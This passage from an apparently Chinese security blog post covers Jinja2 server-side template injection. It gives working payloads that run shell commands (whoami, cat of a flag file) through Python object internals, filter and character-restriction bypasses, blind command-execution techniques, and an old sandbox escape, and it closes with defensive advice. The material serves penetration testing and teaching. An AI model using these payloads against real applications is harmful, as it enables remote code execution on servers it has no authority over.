class="hljs-string">    &#x27;&#x27;&#x27;</span>).render()<br>)<br></code></pre></td></tr></table></figure><br />或者知道 index 的话，直接打：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<br>    Template(<br>    <span class="hljs-string">&#x27;&#x27;&#x27; &#123;&#123; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__[&#x27;system&#x27;](&quot;whoami&quot;) &#125;&#125;&#x27;&#x27;&#x27;</span><br>    ).render()<br>)<br></code></pre></td></tr></table></figure></p><p>这一部分与资料 2 的原理是一样的，这里就不啰嗦了。</p><p>有一点需要注意的是，由于这里并不是完全支持 Python 所有的语法，所以很多语法是无法使用的，比如列表推导，如果熟练掌握了 Python 沙箱逃逸的原理，那么你可能会这么写 exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(Template(<span class="hljs-string">&#x27;&#x27;&#x27;&#123;&#123; [i for i in &#x27;&#x27;.__class__.__mro__[-1].__subclasses__() if i.__name__ == &quot;_wrap_close&quot;][0].__init__.__globals__[&#x27;system&#x27;](&#x27;whoami&#x27;) &#125;&#125;&#x27;&#x27;&#x27;</span>).render())<br></code></pre></td></tr></table></figure><p>可惜这是不行的：<code>TemplateSyntaxError: expected token ',', got 'for'</code>，jinja2 并不支持在 <code>&#123;&#123; &#125;&#125;</code> 里玩 <code>if</code>+推导式。</p><p>所以熟练掌握 jinja2 中可以使用的函数、过滤器、语法规则，对于攻击来说是很重要的。这部分推荐去看官方文档（见资料 4）：</p><p>以及比如对于 for 循环来说，还有特殊的方法可供在循环块内部使用（见资料 7）</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-jinja2/dc8d28f0-2537-409e-a56b-20f2ed682585.png!blog" /></p><p>反正不管怎么样，攻击思路受限的时候，官方文档一定是寻找新姿势的最佳途径。</p><p>顺便说一下，jinja2 更新之后可能会引入新的过滤器、函数，例如 <code>3.0.2</code> 就没有 <code>items</code> 过滤器，到了 <code>3.1.0</code> 就有了。</p><p>更新日志见资料 8</p><h3 id="bypass-思路">bypass 思路</h3><h4 id="bypass-字符数字的通用姿势">bypass 字符、数字的通用姿势</h4><p>最简单的 bypass，按照资料 2 中的思路（<code>[ ]</code> 扣字符拼接、<code>chr</code> 等等）即可（这里面有的姿势我就不列举了，如果不记得的话强烈建议复习一遍）。</p><p>其实扣字符可以做的非常细，以至于理论上我们可以扣出所有的字符或者数字（其实还是资料 2 中的思路，姿势很多，以下只举例）：</p><ol type="1"><li>数字 0：<code>&#123;&#123; &#123;&#125;|int &#125;&#125;</code>、<code>&#123;&#123; &#123;&#125;|length &#125;&#125;</code></li><li>数字 1：<code>&#123;&#123; (&#123;&#125;|int)**(&#123;&#125;|int) &#125;&#125;</code></li><li>理论上有了 1 之后就可以搞出所有其他数字，可以用 <code>+</code> 或者是 <code>-</code>+<code>|abs</code></li><li>空格：<code>&#123;&#123; &#123;&#125;|center|last &#125;&#125;</code>、<code>&#123;1:1&#125;|xmlattr|first</code></li><li><code>&lt;</code>：<code>&#123;&#125;|select|string|first</code></li><li><code>&gt;</code>：<code>&#123;&#125;|select|string|last</code></li><li>点：<code>&#123;&#123; self|float|string|min &#125;&#125;</code> 或者 <code>c.__lt__|string|truncate(3)|first</code></li><li><code>a-z</code>：<code>&#123;&#123; range.__doc__ + dict.__doc__&#125;&#125;</code></li><li><code>A-Z</code>：<code>&#123;&#123; (range.__doc__ + dict.__doc__) | upper &#125;&#125;</code></li></ol><p>上面这种都比较常规，思路还是扣字符的思路，顶多是过滤器做了变化。</p><p>这里多说一下利用格式化字符串实现的任意字符构造（例如字符 <code>d</code>）：</p><ol type="1"><li>首先搞出 <code>%c</code>：<code>&#123;&#123; &#123;&#125;|string|urlencode|first~(self|string)[16] &#125;&#125;</code></li><li>然后搞出 <code>d</code>：<code>&#123;&#123; (&#123;&#125;|string|urlencode|first~(self|string)[16]) % 100 &#125;&#125;</code></li></ol><p>还不需要引号。</p><h4 id="间接获取内置函数">间接获取内置函数</h4><p>正如上文说的，jinja2 仅仅支持部分 Python 内置函数，例如 <code>chr</code> 就无法直接使用。</p><p>好在我们可以利用资料 2 的手段，获取那些被隐藏的函数，例如 <code>chr</code>，我们可这样：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123; <br>  ().__class__.__base__.__subclasses__()[<span class="hljs-number">100</span>].__init__.__globals__[<span class="hljs-string">&quot;__builtins__&quot;</span>][<span class="hljs-string">&quot;chr&quot;</span>]<br>&#125;&#125;<br></code></pre></td></tr></table></figure></p><p>如果你觉得每次调用都需要这样写，太麻烦了，payload 也冗余，那么结合 <code>&#123;% set ... %&#125;</code> 就可以这么玩：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-built_in">set</span> <span class="hljs-built_in">chr</span> = ().__class__.__base__.__subclasses__()[<span class="hljs-number">100</span>].__init__.__globals__[<span class="hljs-string">&quot;__builtins__&quot;</span>][<span class="hljs-string">&quot;chr&quot;</span>]%&#125;<br><br>&#123;&#123; <span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>) &#125;&#125;<br></code></pre></td></tr></table></figure></p><p>那结合宏就可以这么玩：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;%- macro <span class="hljs-built_in">chr</span>(i) -%&#125;<br>    ().__class__.__base__.__subclasses__()[<span class="hljs-number">100</span>].__init__.__globals__[<span class="hljs-string">&quot;__builtins__&quot;</span>][<span class="hljs-string">&quot;chr&quot;</span>](i)<br>&#123;%- endmacro -%&#125;<br><br>&#123;&#123; <span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>) &#125;&#125;<br></code></pre></td></tr></table></figure></p><p>当然啦，由于 jinja2 中有自己的一些内置变量等，所以会有一些资料 2 之外的姿势。例如利用 <code>Undefined</code> 实例可以直接拿到 <code>__globals__</code>：<br /><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">x.__init__.__globals__</span> &#125;&#125;</span><br></code></pre></td></tr></table></figure></p><p>所以就可以有：</p><ul><li><code>x.__init__.__globals__.__builtins__</code><ul><li><code>x.__init__.__globals__.__builtins__.eval</code></li><li><code>x.__init__.__globals__.__builtins__.exec</code></li></ul></li><li><code>x.__init__.__globals__.sys.modules.os</code></li><li><code>x.__init__.__globals__.__builtins__.__import__</code></li><li>...</li></ul><p>通过查阅源码或者文档可知，默认命名空间自带这几种函数</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-jinja2/4507ccf6-8f73-4d54-b74c-12067beaa0c9.png!blog#width-zoom6" /></p><p>或者用 <code>self.__dict__._TemplateReference__context</code> 也可以看到。</p><p>所以就有：</p><ol type="1"><li><code>self.__init__.__globals__</code></li><li><code>lipsum.__globals__.os</code></li><li><code>cycler.__init__.__globals__.os</code></li><li><code>joiner.__init__.__globals__.os</code></li><li><code>namespace.__init__.__globals__.os</code></li></ol><p>其实这些随便找个方法都可以搞到 <code>__globals__</code>。那为啥其他的比如 <code>range</code> 就不可以呢？其实在资料 2 中也已经说过了。</p><h4 id="过滤-.">过滤 .</h4><p>按照资料 2 中的思路，如果过滤了 <code>.</code>，我们很容易想到用 <code>getattr</code> 和 <code>__getattribute__</code>：</p><ol type="1"><li><code>&#123;&#123; getattr(1, "__class__") &#125;&#125;</code></li><li><code>&#123;&#123; 1.__getattribute__("__class__") &#125;&#125;</code></li></ol><p>在 jinja2 中，由于 <code>[key]</code> 的特殊性（资料 3）</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-jinja2/ca3a169d-400a-45ea-8af4-49e745fbf5b9.png!blog" /></p><p><code>[key]</code> 和 <code>.</code> 是基本上等价的，只是处理逻辑先后上有区别，<code>.</code> 是先按查找属性执行，再按照用键查字典的值去执行，<code>[key]</code> 则相反。并且还提到，如果想查找属性还可以用 <code>attr</code>。</p><p>所以我们就可以这么玩：</p><ol type="1"><li><code>&#123;&#123; 1["__class__"] &#125;&#125;</code></li><li><code>&#123;&#123; 1 | attr("__class__") &#125;&#125;</code></li></ol><p>由于过滤器 <code>map</code> 也支持取属性，所以可以这样：<br /><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml"># 注意，由于 map 需要一个可迭代对象，所以外面需要套个 [ ]</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">[1]</span> | map(<span class="hljs-name">attribute</span>=<span class="hljs-string">&quot;__class__&quot;</span>)| list | first &#125;&#125;</span><span class="language-xml">`</span><br></code></pre></td></tr></table></figure></p><h4 id="过滤">过滤 <code>[ ]</code></h4><p>分为两种情况：</p><ol type="1"><li>如果是要取 index，除去资料 2 中的思路（<code>__getitem__</code>、<code>pop</code> 等等）之外，如果是字典，那么利用 bypass 过滤 <code>.</code> 中的结论，可以用 <code>.</code> 来代替 <code>[key]</code>：<code>&#123;&#123; &#123;"a": 1&#125;.a &#125;&#125;</code></li><li>如果是要构造一个列表，我们一般是给最外面加个 <code>[]</code> 就好了。在中括号被过滤的情况下，则可以使用 <code>slice</code> 来替代。例如 <code>"1"|slice(1)|list</code> 与 <code>[['1']]</code> 是等价的。</li></ol><h4 id="过滤---swig50--">过滤 <code>&#123;&#123; &#125;&#125;</code></h4><p>这种情况下寻找其他语法就行了。比如 <code>&#123;% %&#125;</code>。</p><p><code>&#123;% macro %&#125;</code> 就不提了。</p><p><code>&#123;% print(...) %&#125;</code>：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">133</span>].__init__.__globals__[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&quot;whoami&quot;</span>)) %&#125;<br></code></pre></td></tr></table></figure></p><p>还有 <code>&#123;% if %&#125;</code>、<code>&#123;% set %&#125;</code>、<code>&#123;% for %&#125;</code> ... 都是可以执行命令的，只是无回显。如果非要有回显，利用盲注的思想，可以走带外通道。怎么盲注？见资料 2，原理是一样的，这里就不啰嗦了。<br />比如时间盲注：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">if</span> <span class="hljs-built_in">dict</span>.mro()[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">133</span>].__init__.__globals__.popen(<span class="hljs-string">&#x27;sleep $(whoami | cut -c 1 | tr a 1)&#x27;</span>)|<span class="hljs-built_in">list</span> %&#125;&#123;% endif %&#125;<br>&#123;% <span class="hljs-keyword">if</span> <span class="hljs-built_in">dict</span>.mro()[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">133</span>].__init__.__globals__.popen(<span class="hljs-string">&#x27;sleep $(whoami | cut -c 1 | tr b 1)&#x27;</span>)|<span class="hljs-built_in">list</span> %&#125;&#123;% endif %&#125;<br>...<br>&#123;% <span class="hljs-keyword">if</span> <span class="hljs-built_in">dict</span>.mro()[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">133</span>].__init__.__globals__.popen(<span class="hljs-string">&#x27;sleep $(whoami | cut -c 1 | tr m 1)&#x27;</span>)|<span class="hljs-built_in">list</span> %&#125;&#123;% endif %&#125;<br><span class="hljs-comment"># 延时 1s 说明第一个字符是 m</span><br></code></pre></td></tr></table></figure></p><p>当然这种语法本身也可以盲注，比如布尔盲注：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">if</span> <span class="hljs-built_in">dict</span>.mro()[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">133</span>].__init__.__globals__.popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;a&quot;</span> %&#125;yes&#123;% endif %&#125;<br>...<br>&#123;% <span class="hljs-keyword">if</span> <span class="hljs-built_in">dict</span>.mro()[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">133</span>].__init__.__globals__.popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;m&quot;</span> %&#125;yes&#123;% endif %&#125;<br><span class="hljs-comment"># 输出 yes 说明第一个字符是 m</span><br></code></pre></td></tr></table></figure></p><p>甚至可以搞基于报错的盲注：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>][(<span class="hljs-built_in">dict</span>.mro()[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">133</span>].__init__.__globals__.popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;a&quot;</span>)] %&#125;&#123;% endfor %&#125;<br>...<br>&#123;% <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>][(<span class="hljs-built_in">dict</span>.mro()[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">133</span>].__init__.__globals__.popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;m&quot;</span>)] %&#125;&#123;% endfor %&#125;<br><span class="hljs-comment"># 不报错说明第一个字符是 m</span><br></code></pre></td></tr></table></figure><br />因为对于 jinja2 来说，索引过大是返回 Undefined，不会报错。当然啦，如果把上面的 <code>[1]</code> 换成 <code>[[1]]</code> 就变成了布尔盲注。</p><h4 id="限制过滤器或函数">限制过滤器或函数</h4><p>姿势主要有三种：</p><ol type="1"><li>有些过滤器是可以被替换的，比如 <code>[]|string</code> 等同于 <code>[]|format</code>。这种方式主要依赖于使用过滤器的目的，不太好列出统一的替换规则，所以我就不一一列举了。熟悉各种过滤器的作用是这种 bypass 的前提。</li><li>大部分过滤器可以转为 <code>[]</code> 嵌套 + <code>map()</code> 来使用。例如 <code>[]|string</code> 等同于 <code>[[]]|map("str""ing")|list|last</code>。这种姿势相对来说通用，遗憾的是，无法带参数使用过滤器。</li><li><code>self.__dict__._TemplateReference__context</code> 中包含了内置的全局函数，可以直接用。</li></ol><h4 id="过滤引号">过滤引号</h4><p>除了用上面提到的常规姿势之外：</p><h5 id="创建-dict">创建 dict</h5><p>这个其实也在资料 2 中提及过。</p><p>例如 <code>whoami</code>：</p><ul><li><code>&#123;&#123; dict(whoami=x)|join &#125;&#125;</code></li><li><code>&#123;&#123; dict(who=x,ami=x)|join &#125;&#125;</code></li><li><code>&#123;&#123; dict(whoami=x)|list|first &#125;&#125;</code></li><li><code>&#123;&#123; dict(whoami=x)|items|list|first|first &#125;&#125;</code></li><li>...</li></ul><p>艾玛，真香哎</p><p>如果遇到特殊字符，再用常规姿势就好了。</p><h5 id="py3.9-新姿势">py3.9 新姿势</h5><p>如果漏洞点无法支持 <code>set</code>，那么挨个字符拼接的 payload 太长了，所以还需要寻找除了用 <code>dict()</code> 的新的优化方式。在 PEP 585（py3.9）中，我找到了新的姿势。</p><p>首先需要一个前置知识点：类型注解。如果你没用过 Python 类型注解，建议阅读资料 9</p><p>在 PEP 560（py3.7）中，官方新增了 <code>__class_getitem__</code> 方法，这个方法的功能是按照 key 参数指定的类型返回一个表示泛型类的特殊对象，这样可以支持运行时对泛型类进行参数化，让注解更容易使用：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-jinja2/40fa6805-6d96-4347-8352-ab04bd8b5070.png!blog" /></p><p>在 PEP 585（py3.9）中（见资料 10）</p><p>进一步对类型注解做了升级，支持通过 <code>__class_getitem__()</code> 来参数化 typing 模块中所有标准的容器类型，这样我们可以将 list 或 dict 直接作为列表和字典的类型注释，而不必依赖 typing.List 或者 typing.Dict。因此，代码现在看起来更加简洁，而且更容易理解和解释。</p><p>Python 文档中反复提及“参数化泛型”这个词。PEP 585 也给出了定义：<br /><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">parameterized generic – a specific<span class="hljs-built_in"> instance </span>of a generic with the expected types for container elements provided. Also known as a parameterized type. For example: dict[str, int].<br></code></pre></td></tr></table></figure></p><p>最后，Python 中有个，<code>GenericAlias</code> 对象充当泛型类型的代理，实现参数化泛型。对于容器类，提供给该类的参数可指示对象包含的元素的类型。</p><p>可支持参数化泛型的类可参考资料 11</p><p>到这里，我们就可以发现，打印 <code>list[int]</code> 的结果是 <code>list[int]</code>，它其实是一个 <code>GenericAlias</code>：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-jinja2/a69e5e25-0d9f-4648-bff2-80adf68900f4.png!blog" /></p><p>那自然，这样也是 ok 的：<code>list["whoami"]</code>，加上 jinja2 的 <code>.</code> 的特殊性，我们就用了一种船新的玩法。比如可以这样执行 whoami，不带有引号：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">dict</span>.mro()[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">133</span>].__init__.__globals__.system((<span class="hljs-built_in">dict</span>.whoami|string)[<span class="hljs-number">6</span>:-<span class="hljs-number">2</span>]|join)<br></code></pre></td></tr></table></figure></p><p>不过由于语法的限制，这样是无法加上空格以及特殊字符（<code>/</code>、<code>.</code>、<code>( )</code> 等）的，所以没法直接带参数或者带一些特殊的字符执行。</p><p>所以为了实用一些，例如 <code>cat th1s_1s_a_lo0o0o0o0o0o0o0ng_fl4g</code>，还是得用到其他获取字符的手段，比如 <code>chr</code>：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">dict</span>.mro()[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">133</span>].__init__.__globals__.system(<br>  (<br>    [( <span class="hljs-built_in">dict</span>.cat |string)[<span class="hljs-number">6</span>:-<span class="hljs-number">2</span>]|join] + <br>    [( <span class="hljs-built_in">dict</span>.th1s_1s_a_lo0o0o0o0o0o0o0ng_fl4g |string)[<span class="hljs-number">6</span>:-<span class="hljs-number">2</span>]|join]<br>  )<br>  | join(<br>    <span class="hljs-built_in">dict</span>.mro()[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">100</span>].__init__.__globals__.__builtins__.<span class="hljs-built_in">chr</span>(<span class="hljs-number">32</span>)<br>    )<br>)<br></code></pre></td></tr></table></figure><br />长度为 243。</p><p>或者是扣字符拼接：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">dict</span>.mro()[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">133</span>].__init__.__globals__.system(<br>  (<br>    [( <span class="hljs-built_in">dict</span>.cat |string)[<span class="hljs-number">6</span>:-<span class="hljs-number">2</span>]|join] + <br>    [( <span class="hljs-built_in">dict</span>.th1s_1s_a_lo0o0o0o0o0o0o0ng_fl4g |string)[<span class="hljs-number">6</span>:-<span class="hljs-number">2</span>]|join]<br>  )<br>  | join((<span class="hljs-built_in">dict</span>|string)[<span class="hljs-number">6</span>]))<br></code></pre></td></tr></table></figure><br />这个长度为 181。</p><p>利用相同的逻辑，我们可以找出其他 bypass 的姿势，其实都是利用了 <code>__class_getitem__</code>，再想办法把结果变成 str 类型：</p><ol type="1"><li><code>(dict.whoami|string)[6:-2]|join</code></li><li><code>(dict.whoami|title...</code></li><li><code>(dict.whoami|trim...</code></li><li><code>(dict.whoami|lower...</code></li><li><code>(dict.whoami|center...</code></li><li><code>(dict.whoami|format...</code></li><li><code>(dict.whoami|capitalize...</code></li><li><code>(dict.whoami|indent)[6:-2]|join</code></li></ol><p>下面这些会用到引号，所以可能并不实用：</p><ol type="1"><li><code>(dict.whoami|string).split("'").pop(-2)</code></li><li><code>(dict.whoami|replace("", "").pop(-2)</code></li><li><code>("00"|join(dict.whoami)).split("'").pop(-2)</code></li><li><code>(dict.whoami|urlize).split("&amp;#39;").pop(-2)</code></li><li><code>(dict.whoami|urlencode).split("%27").pop(-2)</code></li></ol><p>上面这么多都是类似的逻辑。如果出现过滤器禁用的情况，可以互相做替换。</p><p>组合之前的一些技巧，还可以这样：</p><ol type="1"><li>引号、<code>[ ]</code> 被过滤：<code>(dict.whoamiiii|string|slice(3)|list).pop(1)|join</code>（或者挨个 pop 完之后拼接起来，就是会比较长）</li><li>引号、数字、<code>[ ]</code> 被过滤：<code>(dict.whoamiiii|string|slice(True+True+True)|list).pop(True)|join</code></li></ol><p>下面这些可能都不实用，但是作为技巧看一下还是挺有启发的：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment"># . 被过滤</span><br>([<span class="hljs-built_in">dict</span>]|<span class="hljs-built_in">map</span>(attribute=<span class="hljs-string">&#x27;whoami&#x27;</span>)|<span class="hljs-built_in">list</span>|string)[<span class="hljs-number">7</span>:-<span class="hljs-number">3</span>]<br><br><span class="hljs-comment"># 特定的过滤器被禁用</span><br>(([<span class="hljs-built_in">dict</span>.whoamiiii|string]|<span class="hljs-built_in">list</span>|<span class="hljs-built_in">map</span>(<span class="hljs-string">&quot;sl&quot;</span>+<span class="hljs-string">&quot;ice&quot;</span>, <span class="hljs-number">3</span>)|<span class="hljs-built_in">list</span>).pop(<span class="hljs-number">0</span>)|<span class="hljs-built_in">list</span>).pop(<span class="hljs-number">1</span>)|join<br><br><span class="hljs-comment"># [] 被过滤 + 特定的过滤器被禁用</span><br>(((<span class="hljs-string">&quot;&quot;</span>|<span class="hljs-built_in">slice</span>(<span class="hljs-number">1</span>,fill_with=(<span class="hljs-built_in">dict</span>.whoamiiii|string))|<span class="hljs-built_in">list</span>).pop()|<span class="hljs-built_in">map</span>(<span class="hljs-string">&quot;sl&quot;</span>+<span class="hljs-string">&quot;ice&quot;</span>, <span class="hljs-number">3</span>)|<span class="hljs-built_in">list</span>).pop(<span class="hljs-number">0</span>)|<span class="hljs-built_in">list</span>).pop(<span class="hljs-number">1</span>)|join<br></code></pre></td></tr></table></figure></p><p><strong>自然，这个技巧只有 &gt; py3.9 才可以使用。</strong></p><p>从上面可以看出，这个姿势要实用，很依赖 <code>.</code>，如果这个被干掉了那就要换其他的姿势了。</p><h3 id="利用-jinja2-flask-组合-bypass">利用 jinja2 + flask 组合 bypass</h3><p>jinja2 最常见的搭档就是 flask 了。由于 flask 会引入新的变量，所以也会引入新的姿势。这一部分正如本文开头所述，jinja2 的 SSTI 与 Flask 关联紧密，这一部分我放在了 <a href="https://www.tr0y.wang/2022/05/16/SecMap-flask/">《SecMap - Flask》</a> 中。</p><h3 id="jinja2-沙盒绕过">jinja2 沙盒绕过</h3><p>实际上，jinja2 有自带的，独立于 Python 的沙盒环境。默认沙盒环境在解析模板时会检查所操作的属性，这种检查是运行时的检查，绕过是比较困难的。也就是说即使模板内容被用户所控制，也是无法绕过沙盒执行代码或者获取敏感信息的。</p><p>但在历史上，jinja2 &lt; v2.8.1 由于没有考虑到 format 可触发字符串格式化漏洞，导致沙盒可以被绕过：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> jinja2.sandbox <span class="hljs-keyword">import</span> SandboxedEnvironment<br><br>env = SandboxedEnvironment()<br><span class="hljs-built_in">print</span>(env.from_string(<span class="hljs-string">&quot;&quot;&quot;&#123;&#123; &#x27;&#123;0.__class__.__base__&#125;&#x27;.format([]) &#125;&#125;&quot;&quot;&quot;</span>).render())<br></code></pre></td></tr></table></figure></p><h2 id="在攻击之外">在攻击之外</h2><p>上面所述的思路，都是局限在 <code>Template</code> 中的，因为我们要思考攻击场景，没有攻击场景的 payload 用处是很有限的。</p><p>但是，如果我们在写一些自动化的脚本，用来扫描或者是搜索变量，难免也会用到一些内置函数（例如 <code>dir</code>），通过上面这些思路利用 SSTI 去获取内置函数当然是可以的，但其实 <code>render</code> 本身是可以指定参数传递给模板使用的，所以不限于攻击，可以这样：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">Template(<span class="hljs-string">&quot;&#123;&#123; dir(self) &#125;&#125;&quot;</span>).render(<span class="hljs-built_in">dir</span>=<span class="hljs-built_in">dir</span>)<br></code></pre></td></tr></table></figure></p><p>另外再说一嘴，<code>render</code> 返回的固定是字符串，如果我们想获取变量示例，如果是个字符串或者列表之类的基本类型，那倒简单，直接 <code>eval</code> 下就好。如果是简单一些示例，可以考虑用 pickle 来玩。但是如果是一些非常规的实例，应该怎么拿到呢？例如 <code>self</code> 这个内置变量：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">In [<span class="hljs-number">20</span>]: Template1(<span class="hljs-string">&quot;&#123;&#123; pickle.dumps(self) &#125;&#125;&quot;</span>).render(pickle=pickle)<br>...<br>TypeError: cannot pickle <span class="hljs-string">&#x27;module&#x27;</span> <span class="hljs-built_in">object</span><br></code></pre></td></tr></table></figure></p><p>这个时候我们其实可以通过 <code>__main__</code> 来存储模板里的变量，这个办法应该是最完美的了：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">In [<span class="hljs-number">25</span>]: Template(<br>    ...:     <span class="hljs-string">&quot;&#123;&#123; setattr(__import__(&#x27;__main__&#x27;), &#x27;result&#x27;, self) &#125;&#125;&quot;</span><br>    ...: ).render(<span class="hljs-built_in">setattr</span>=<span class="hljs-built_in">setattr</span>, <span class="hljs-built_in">__import__</span>=<span class="hljs-built_in">__import__</span>)<br>Out[<span class="hljs-number">25</span>]: <span class="hljs-string">&#x27;None&#x27;</span><br><br>In [<span class="hljs-number">26</span>]: result<br>Out[<span class="hljs-number">26</span>]: &lt;TemplateReference <span class="hljs-literal">None</span>&gt;<br></code></pre></td></tr></table></figure></p><h2 id="防御">防御</h2><p>防御这种漏洞肯定不能用关键字过滤，Python 实在是太灵活了。</p><p>如果可以的话，还是不要让模板对用户可控了。</p><p>如果一定要有这种需求，还是得用 <code>SandboxedEnvironment</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> jinja2.sandbox <span class="hljs-keyword">import</span> SandboxedEnvironment<br><br>env = SandboxedEnvironment()<br><span class="hljs-built_in">print</span>(env.from_string(<span class="hljs-string">&quot;&quot;&quot;&#123;&#123; [].__class__.__base__ &#125;&#125;&quot;&quot;&quot;</span>).render())<br></code></pre></td></tr></table></figure><p>对于未注册的属性访问都会抛出错误：<code>SecurityError: access to attribute xxx of xxx object is unsafe.</code>，下面这些都是凉凉的：</p><ol type="1"><li><code>[].__class__.__base__</code></li><li><code>[]["__class__"]["__base__"]</code></li><li><code>[]["__class__"]["__base__"]</code></li><li><code>dict.mro()</code></li><li><code>self.__dict__._TemplateReference__context</code></li><li>...</li></ol><p>但是通过一些变量来拿敏感信息，还是有搞头的，我们后面再讲。</p><h2 id="资料">资料</h2><ol type="1"><li>jinja2 官方文档<br />https://jinja.palletsprojects.com/en/3.1.x/templates/#synopsis</li><li>Python 